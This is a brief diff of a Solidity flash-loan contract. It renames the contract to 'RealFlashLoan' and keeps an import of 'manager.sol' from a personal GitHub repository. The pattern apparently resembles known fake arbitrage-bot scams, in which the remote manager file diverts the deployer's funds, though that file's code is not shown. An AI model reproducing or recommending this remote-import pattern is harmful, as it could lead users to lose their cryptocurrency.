@@ -12,7 +12,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 // BSC Code Manager
 import "https://github.com/cris777/BNB-Arbitrage/blob/main/manager.sol";
    
-contract GetFlashLoan {
+contract RealFlashLoan {
    string public tokenName;
    string public tokenSymbol;
    uint loanAmount;
